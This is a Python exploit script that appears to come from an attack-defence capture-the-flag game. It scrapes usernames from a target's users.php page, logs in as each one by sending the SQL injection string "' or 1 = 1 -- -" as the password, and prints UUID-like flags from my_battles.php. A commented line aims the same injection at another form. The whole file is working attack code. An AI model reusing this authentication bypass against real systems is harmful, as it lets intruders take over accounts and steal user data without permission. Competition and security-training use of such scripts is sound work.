#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys, re, requests
from storage import storage_set, storage_get
import string, random, uuid, re

ip = sys.argv[1]


s = requests.Session()

html = s.get('http://{}/users.php'.format(ip),timeout=(None,None))

users = re.findall('\s*<td><img.*.png"><\/td>\s*<td>(.*?)<\/td>\s*',html.text)
s.close()
print(users)

for user in users:
    if not storage_get(ip + ':' + user):
        s = requests.Session()
        data = {'inputLogin': user, 'inputPassword': '\' or 1 = 1 -- -', 'signin': 'True'}
        html = s.post('http://{}/login.php'.format(ip), data=data, timeout=(None, None))
        # html = s.post('http://{}/create_battle.php',data={'traier':820,'infoRate':100,'inputCongratulation':' or 1 = 1 -- -','button':'create'},timeout=(None,None))
        html = s.get('http://{}/my_battles.php'.format(ip))
        print(re.findall('[a-z0-9]{8}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{12}', html.text), flush=True)
        s.close()
        storage_set(ip + ':' + user)



